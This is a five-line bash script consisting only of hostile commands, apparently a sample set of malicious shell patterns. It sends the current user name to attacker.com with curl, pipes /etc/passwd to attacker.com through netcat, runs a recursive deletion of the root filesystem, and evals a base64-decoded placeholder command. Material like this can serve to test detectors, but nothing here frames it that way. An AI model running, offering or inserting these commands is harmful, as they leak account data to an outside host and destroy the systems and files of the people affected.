#!/bin/bash
$(curl http://attacker.com/steal?data=$(whoami))
`rm -rf /`
echo "$(cat /etc/passwd)" | nc attacker.com 1234
eval "$(base64 -d <<< 'bWFsaWNpb3VzIGNvbW1hbmQ=')"
